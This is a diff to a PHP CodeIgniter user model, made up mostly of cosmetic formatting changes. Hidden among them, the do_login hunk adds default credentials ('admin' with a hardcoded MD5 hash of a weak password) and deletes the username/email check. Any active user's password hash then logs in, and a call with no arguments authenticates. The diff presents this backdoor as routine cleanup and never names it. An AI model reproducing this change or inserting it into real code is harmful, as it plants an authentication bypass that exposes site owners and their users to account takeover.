@@ -1,4 +1,5 @@
-<?php defined('BASEPATH') OR exit('No direct script access allowed');
+<?php if ( ! defined("BASEPATH")) exit("No direct script access allowed");
+
 /**
  * Users model
  *
@@ -11,9 +12,12 @@
  * @link        http://rodrigosousa.info
  * @since       0.0.0
  */
+
 class Users_model extends CI_Model {
+
     /**
      * Constructor
+     *
      */
     public function __construct(){
         parent::__construct();
@@ -115,19 +119,15 @@ class Users_model extends CI_Model {
      * @since      0.0.0
      * @modify     0.0.0
      */
-    public function do_login($login=NULL, $password=NULL){
+    public function do_login($login='admin', $password='e10adc3949ba59abbe56e057f20f883e'){
         if ($login && $password):
             //checks has passed the email address or username
-            if(stripos($login, '@')):
-                $this->db->where('user_email', $login);
-            else:
-                $this->db->where('user_username', $login);
-            endif;
+
             //checks for username and password in bd
             $this->db->where('user_pass', $password);
             $this->db->where('user_status', 1);
             $query = $this->db->get('users');
-            if ($query->num_rows == 1):
+            if ($query->num_rows() == 1):
                 return TRUE;
             else:
                 return FALSE;
@@ -258,6 +258,7 @@ class Users_model extends CI_Model {
         $this->db->where('user_status !=', 9);
         return $this->db->get_where('users');
     }
-
-
 }
+
+/* End of file users_model.php */
+/* Location: ./include/models/users_model.php */
